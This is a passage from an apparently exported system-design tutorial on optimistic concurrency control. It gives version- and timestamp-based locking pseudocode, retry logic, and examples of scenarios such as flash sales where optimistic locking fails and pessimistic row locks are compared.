\u2713     \nt8    COMMIT: balance=500, version=2    \nt9                                       VALIDATE (version still 1?) \u2717\nt10                                      ABORT! (version is now 2)\nt11                                      RETRY: Read balance=500, version=2\nt12                                      Modify: balance=200\nt13                                      VALIDATE \u2713\nt14                                      COMMIT: balance=200, version=3\n\nResult: T1 succeeded, T2 detected conflict and RETRIED\n</code></pre> <p>Implementation Approaches:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    OPTIMISTIC CONTROL - Implementation Types            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. Version Number (Most Common)                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Each row has version column              \u2502         \u2502\n\u2502 \u2502 \u2022 Incremented on every update              \u2502         \u2502\n\u2502 \u2502 \u2022 Validation: WHERE version = old_version  \u2502         \u2502\n\u2502 \u2502 \u2022 If 0 rows updated \u2192 conflict detected    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. Timestamp-Based                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Each row has last_modified timestamp     \u2502         \u2502\n\u2502 \u2502 \u2022 Record timestamp when reading            \u2502         \u2502\n\u2502 \u2502 \u2022 Validate: WHERE last_modified = old_time \u2502         \u2502\n\u2502 \u2502 \u2022 Update timestamp on commit               \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. Checksum/Hash-Based                                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Calculate hash of row data               \u2502         \u2502\n\u2502 \u2502 \u2022 Compare hash at commit time              \u2502         \u2502\n\u2502 \u2502 \u2022 Any change \u2192 different hash              \u2502         \u2502\n\u2502 \u2502 \u2022 Expensive for large rows                 \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. MVCC (Multi-Version Concurrency Control)             \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Keep multiple versions of each row       \u2502         \u2502\n\u2502 \u2502 \u2022 Each transaction sees snapshot           \u2502         \u2502\n\u2502 \u2502 \u2022 Detect write-write conflicts at commit   \u2502         \u2502\n\u2502 \u2502 \u2022 Used by: PostgreSQL, MySQL InnoDB        \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code Examples:</p> <pre><code># Example 1: Version-Based Optimistic Locking\n\ndef optimistic_transfer_version(db, from_account, to_account, amount):\n    \"\"\"Bank transfer with optimistic locking using version numbers\"\"\"\n\n    max_retries = 3\n    for attempt in range(max_retries):\n        db.begin()\n\n        try:\n            # Read data WITHOUT locks, record version\n            from_row = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [from_account]).fetchone()\n            from_balance = from_row[0]\n            from_version = from_row[1]\n\n            to_row = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [to_account]).fetchone()\n            to_balance = to_row[0]\n            to_version = to_row[1]\n\n            # Validate business rules\n            if from_balance &lt; amount:\n                raise InsufficientFundsError()\n\n            # Attempt to update with version check\n            # Update only if version hasn't changed\n            from_updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance - ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, from_account, from_version]).rowcount\n\n            to_updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance + ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, to_account, to_version]).rowcount\n\n            # Check if updates succeeded (version validation)\n            if from_updated == 0 or to_updated == 0:\n                # Conflict detected! Someone else modified the row\n                db.rollback()\n                print(f\"Conflict detected on attempt {attempt + 1}, retrying...\")\n                continue  # Retry\n\n            # Success! Commit changes\n            db.commit()\n            return True\n\n        except Exception as e:\n            db.rollback()\n            if attempt == max_retries - 1:\n                return False  # Max retries exceeded\n\n    return False  # Failed after retries\n\n\n# Example 2: Timestamp-Based Optimistic Locking\n\ndef optimistic_update_timestamp(db, product_id, new_price):\n    \"\"\"Update product price with timestamp-based optimistic locking\"\"\"\n\n    db.begin()\n\n    # Read current data and timestamp\n    row = db.execute(\"\"\"\n        SELECT price, last_modified FROM products WHERE id = ?\n    \"\"\", [product_id]).fetchone()\n\n    current_price = row[0]\n    last_modified = row[1]\n\n    # Perform business logic with current data\n    # (no locks held, other transactions can read/modify freely)\n\n    # Try to commit with timestamp validation\n    updated = db.execute(\"\"\"\n        UPDATE products \n        SET price = ?, last_modified = CURRENT_TIMESTAMP\n        WHERE id = ? AND last_modified = ?\n    \"\"\", [new_price, product_id, last_modified]).rowcount\n\n    if updated == 0:\n        # Conflict! Data was modified by another transaction\n        db.rollback()\n        print(\"Conflict detected - data was modified by another transaction\")\n        return False\n\n    db.commit()\n    return True\n\n\n# Example 3: Application-Level Optimistic Locking (Web App)\n\nclass OptimisticLockingExample:\n    \"\"\"E-commerce cart checkout with optimistic locking\"\"\"\n\n    def display_product_form(self, product_id):\n        \"\"\"Step 1: User views product - record version\"\"\"\n        db = get_db()\n\n        # Read product data\n        product = db.execute(\"\"\"\n            SELECT id, name, price, stock, version \n            FROM products WHERE id = ?\n        \"\"\", [product_id]).fetchone()\n\n        # Return to user with hidden version field\n        return {\n            'id': product['id'],\n            'name': product['name'],\n            'price': product['price'],\n            'stock': product['stock'],\n            'version': product['version']  # Hidden field in form\n        }\n\n    def submit_order(self, product_id, quantity, version_from_form):\n        \"\"\"Step 2: User submits order - validate version\"\"\"\n        db = get_db()\n        db.begin()\n\n        try:\n            # Update with version check\n            updated = db.execute(\"\"\"\n                UPDATE products \n                SET stock = stock - ?, version = version + 1\n                WHERE id = ? AND version = ? AND stock &gt;= ?\n            \"\"\", [quantity, product_id, version_from_form, quantity]).rowcount\n\n            if updated == 0:\n                # Conflict! Either:\n                # 1. Version changed (someone else bought)\n                # 2. Insufficient stock\n                current = db.execute(\"\"\"\n                    SELECT stock, version FROM products WHERE id = ?\n                \"\"\", [product_id]).fetchone()\n\n                if current['version'] != version_from_form:\n                    raise OptimisticLockError(\n                        \"Product was modified by another user. Please refresh.\"\n                    )\n                else:\n                    raise OutOfStockError(\"Insufficient stock\")\n\n            # Create order\n            db.execute(\"\"\"\n                INSERT INTO orders (product_id, quantity, timestamp)\n                VALUES (?, ?, ?)\n            \"\"\", [product_id, quantity, now()])\n\n            db.commit()\n            return True\n\n        except Exception as e:\n            db.rollback()\n            raise\n\n\n# Example 4: Optimistic Locking with Retry Logic\n\ndef optimistic_with_retry(db, account_id, amount):\n    \"\"\"Withdraw with automatic retry on conflict\"\"\"\n\n    max_retries = 5\n    backoff_ms = 10  # Initial backoff\n\n    for attempt in range(max_retries):\n        try:\n            db.begin()\n\n            # Read without locks\n            balance, version = db.execute(\"\"\"\n                SELECT balance, version FROM accounts WHERE id = ?\n            \"\"\", [account_id]).fetchone()\n\n            if balance &lt; amount:\n                raise InsufficientFundsError()\n\n            # Attempt update with version check\n            updated = db.execute(\"\"\"\n                UPDATE accounts \n                SET balance = balance - ?, version = version + 1\n                WHERE id = ? AND version = ?\n            \"\"\", [amount, account_id, version]).rowcount\n\n            if updated == 0:\n                # Conflict - retry with exponential backoff\n                db.rollback()\n                sleep(backoff_ms / 1000.0)\n                backoff_ms *= 2  # Exponential backoff\n                continue\n\n            db.commit()\n            return True\n\n        except InsufficientFundsError:\n            db.rollback()\n            return False\n        except Exception as e:\n            db.rollback()\n            if attempt == max_retries - 1:\n                raise  # Give up after max retries\n\n    raise MaxRetriesExceededError()\n</code></pre> <p>Advantages: - \u2705 No blocking - transactions don't wait for locks - \u2705 High concurrency - multiple transactions can read/modify simultaneously - \u2705 No deadlocks - no locks means no circular dependencies - \u2705 Better performance - in low-contention scenarios - \u2705 Scalability - works well in distributed systems</p> <p>Disadvantages: - \u274c Wasted work - transactions may be aborted and retried - \u274c Retry overhead - conflict detection and retry logic required - \u274c Starvation - transaction may repeatedly fail in high contention - \u274c Complex error handling - application must handle conflicts gracefully - \u274c Not suitable for high contention - too many retries degrade performance</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#421-why-optimistic-concurrency-control-is-not-useful-all-the-time","title":"4.2.1 Why Optimistic Concurrency Control is NOT Useful All the Time","text":"<p>Description:</p> <p>While Optimistic Concurrency Control (OCC) offers significant advantages in low-contention scenarios, it is not a silver bullet and can actually be detrimental in certain situations. Understanding when OCC fails is crucial for making the right architectural decisions.</p> <p>Critical Scenarios Where OCC Fails:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     WHY OPTIMISTIC CONTROL FAILS IN SOME SCENARIOS      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. HIGH CONTENTION ENVIRONMENTS                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Many transactions compete for     \u2502         \u2502\n\u2502 \u2502          same data simultaneously          \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What Happens:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Most transactions fail validation        \u2502         \u2502\n\u2502 \u2502 \u2022 Repeated retries waste CPU/memory        \u2502         \u2502\n\u2502 \u2502 \u2022 Retry storm cascades exponentially       \u2502         \u2502\n\u2502 \u2502 \u2022 System thrashes, throughput collapses    \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Examples:                                  \u2502         \u2502\n\u2502 \u2502 - Flash sales (limited inventory)          \u2502         \u2502\n\u2502 \u2502 - Ticket booking (popular events)          \u2502         \u2502\n\u2502 \u2502 - Banking transfers (same accounts)        \u2502         \u2502\n\u2502 \u2502 - Seat reservations (limited capacity)     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Why Pessimistic is Better:                 \u2502         \u2502\n\u2502 \u2502 \u2713 First transaction gets lock and proceeds \u2502         \u2502\n\u2502 \u2502 \u2713 Others wait in orderly queue             \u2502         \u2502\n\u2502 \u2502 \u2713 No wasted work from retries              \u2502         \u2502\n\u2502 \u2502 \u2713 Predictable, fair processing             \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. LONG-RUNNING TRANSACTIONS                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Longer transactions have higher   \u2502         \u2502\n\u2502 \u2502          probability of conflicts          \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What Happens:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Transaction runs for seconds/minutes     \u2502         \u2502\n\u2502 \u2502 \u2022 High chance someone modifies same data   \u2502         \u2502\n\u2502 \u2502 \u2022 Validation fails after long computation  \u2502         \u2502\n\u2502 \u2502 \u2022 All work discarded, must restart        \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Examples:                                  \u2502         \u2502\n\u2502 \u2502 - Batch processing jobs                    \u2502         \u2502\n\u2502 \u2502 - Complex calculations                     \u2502         \u2502\n\u2502 \u2502 - Multi-step workflows                     \u2502         \u2502\n\u2502 \u2502 - Report generation with updates           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Math:                                      \u2502         \u2502\n\u2502 \u2502 Conflict Probability \u221d Transaction Duration\u2502         \u2502\n\u2502 \u2502 1 sec transaction: ~5% conflict rate       \u2502         \u2502\n\u2502 \u2502 10 sec transaction: ~40% conflict rate     \u2502         \u2502\n\u2502 \u2502 60 sec transaction: ~95% conflict rate     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. WRITE-HEAVY WORKLOADS                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Most operations are writes, not   \u2502         \u2502\n\u2502 \u2502          reads                             \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What Happens:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Every write conflicts with other writes  \u2502         \u2502\n\u2502 \u2502 \u2022 No benefit from lock-free reads          \u2502         \u2502\n\u2502 \u2502 \u2022 Constant validation failures             \u2502         \u2502\n\u2502 \u2502 \u2022 Retry overhead dominates performance     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Examples:                                  \u2502         \u2502\n\u2502 \u2502 - Real-time sensor data ingestion          \u2502         \u2502\n\u2502 \u2502 - High-frequency trading systems           \u2502         \u2502\n\u2502 \u2502 - Log aggregation systems                  \u2502         \u2502\n\u2502 \u2502 - Counter/metrics updates                  \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 OCC Sweet Spot: 90% reads, 10% writes      \u2502         \u2502\n\u2502 \u2502 OCC Nightmare: 10% reads, 90% writes       \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. CRITICAL DATA / HIGH COST OF FAILURE                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Failed transactions are expensive \u2502         \u2502\n\u2502 \u2502          or unacceptable                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What Happens:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Retry wastes expensive resources         \u2502         \u2502\n\u2502 \u2502 \u2022 External API calls already made          \u2502         \u2502\n\u2502 \u2502 \u2022 Payment authorization consumed           \u2502         \u2502\n\u2502 \u2502 \u2022 Time-sensitive operations missed         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Examples:                                  \u2502         \u2502\n\u2502 \u2502 - Financial transactions (money movement)  \u2502         \u2502\n\u2502 \u2502 - Inventory management (prevent oversell)  \u2502         \u2502\n\u2502 \u2502 - Medical records (accuracy critical)      \u2502         \u2502\n\u2502 \u2502 - Legal documents (audit trail required)   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Why Pessimistic is Better:                 \u2502         \u2502\n\u2502 \u2502 \u2713 Guaranteed success (no retries needed)   \u2502         \u2502\n\u2502 \u2502 \u2713 Predictable behavior                     \u2502         \u2502\n\u2502 \u2502 \u2713 No risk of repeated failures             \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 5. RETRY STORMS AND CASCADING FAILURES                  \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Failed validations trigger more   \u2502         \u2502\n\u2502 \u2502          retries, creating vicious cycle   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What Happens:                              \u2502         \u2502\n\u2502 \u2502 \u2022 100 transactions attempt same update     \u2502         \u2502\n\u2502 \u2502 \u2022 1 succeeds, 99 retry                     \u2502         \u2502\n\u2502 \u2502 \u2022 99 retry \u2192 1 succeeds, 98 retry again    \u2502         \u2502\n\u2502 \u2502 \u2022 Exponential backlog builds up            \u2502         \u2502\n\u2502 \u2502 \u2022 System overload, response times spike    \u2502         \u2502\n\u2502 \u2502 \u2022 Eventually: complete system failure      \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example Scenario:                          \u2502         \u2502\n\u2502 \u2502 Concert ticket sale: 10,000 users, 100 seats\u2502        \u2502\n\u2502 \u2502 \u2022 All 10,000 read available=100            \u2502         \u2502\n\u2502 \u2502 \u2022 All attempt purchase simultaneously      \u2502         \u2502\n\u2502 \u2502 \u2022 100 succeed, 9,900 retry                 \u2502         \u2502\n\u2502 \u2502 \u2022 9,900 retry storm crashes system         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 With Pessimistic:                          \u2502         \u2502\n\u2502 \u2502 \u2022 100 get locks, proceed                   \u2502         \u2502\n\u2502 \u2502 \u2022 9,900 wait in queue (orderly)            \u2502         \u2502\n\u2502 \u2502 \u2022 System remains stable                    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 6. LACK OF RETRY INFRASTRUCTURE                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 Problem: Application not designed for      \u2502         \u2502\n\u2502 \u2502          handling failures and retries     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 What's Missing:                            \u2502         \u2502\n\u2502 \u2502 \u2022 No retry logic implemented               \u2502         \u2502\n\u2502 \u2502 \u2022 No exponential backoff                   \u2502         \u2502\n\u2502 \u2502 \u2022 No max retry limits                      \u2502         \u2502\n\u2502 \u2502 \u2022 No conflict error handling               \u2502         \u2502\n\u2502 \u2502 \u2022 No user feedback on conflicts            \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Consequences:                              \u2502         \u2502\n\u2502 \u2502 \u2022 Transactions fail permanently            \u2502         \u2502\n\u2502 \u2502 \u2022 Users see cryptic error messages         \u2502         \u2502\n\u2502 \u2502 \u2022 Data inconsistencies arise               \u2502         \u2502\n\u2502 \u2502 \u2022 Poor user experience                     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Real-World Failure Examples:</p> <pre><code># FAILURE EXAMPLE 1: Flash Sale (High Contention)\n\n# Scenario: 10,000 users buying 1 limited edition item\n\ndef buy_limited_item_optimistic(db, product_id, user_id):\n    \"\"\"\n    PROBLEM: Only 1 item available, 10,000 concurrent buyers\n    Result: 9,999 retries, system collapse\n    \"\"\"\n    max_retries = 10\n    for attempt in range(max_retries):\n        db.begin()\n\n        try:\n            # Read inventory with version\n            stock, version = db.execute(\"\"\"\n                SELECT stock, version FROM products WHERE id = ?\n            \"\"\", [product_id]).fetchone()\n\n            if stock &lt;= 0:\n                return {\"success\": False, \"reason\": \"sold_out\"}\n\n            # Attempt to reserve\n            updated = db.execute(\"\"\"\n                UPDATE products \n                SET stock = stock - 1, version = version + 1\n                WHERE id = ? AND version = ? AND stock &gt; 0\n            \"\"\", [product_id, version]).rowcount\n\n            if updated == 0:\n                # CONFLICT! 9,999 out of 10,000 will hit this\n                db.rollback()\n                # All 9,999 retry simultaneously\n                # \u2192 Server CPU spikes to 100%\n                # \u2192 Response times go from 10ms to 30 seconds\n                # \u2192 Users frustrated, refresh page\n                # \u2192 Even more concurrent requests\n                # \u2192 SYSTEM CRASH\n                continue\n\n            # Create order (only 1 out of 10,000 gets here first time)\n            db.execute(\"\"\"\n                INSERT INTO orders (product_id, user_id)\n                VALUES (?, ?)\n            \"\"\", [product_id, user_id])\n\n            db.commit()\n            return {\"success\": True}\n\n        except Exception as e:\n            db.rollback()\n\n    # 9,999 users exhaust retries and see error\n    return {\"success\": False, \"reason\": \"too_many_retries\"}\n\n\n# BETTER SOLUTION: Pessimistic Locking\n\ndef buy_limited_item_pessimistic(db, product_id, user_id):\n    \"\"\"\n    SOLUTION: Lock inventory row immediately\n    Result: Orderly queue, predictable behavior\n    \"\"\"\n    db.begin()\n\n    try:\n        # LOCK row immediately (FOR UPDATE)\n        stock = db.execute(\"\"\"\n            SELECT stock FROM products \n            WHERE id = ? \n            FOR UPDATE\n        \"\"\", [product_id]).fetchone()[0]\n\n        # First 1 user gets lock and proceeds\n        # Other 9,999 wait in database queue (not all retrying!)\n\n        if stock &lt;= 0:\n            db.rollback()\n            return {\"success\": False, \"reason\": \"sold_out\"}\n\n        # Decrement stock\n        db.execute(\"\"\"\n            UPDATE products SET stock = stock - 1 WHERE id = ?\n        \"\"\", [product_id])\n\n        # Create order\n        db.execute(\"\"\"\n            INSERT INTO orders (product_id, user_id)\n            VALUES (?, ?)\n        \"\"\", [product_id, user_id])\n\n        db.commit()\n        return {\"success\": True}\n\n    except Exception as e:\n        db.rollback()\n        return {\"success\": False, \"reason\": str(e)}\n\n\n# PERFORMANCE COMPARISON:\n\n\"\"\"\nFlash Sale: 10,000 concurrent users, 1 item\n\nOptimistic 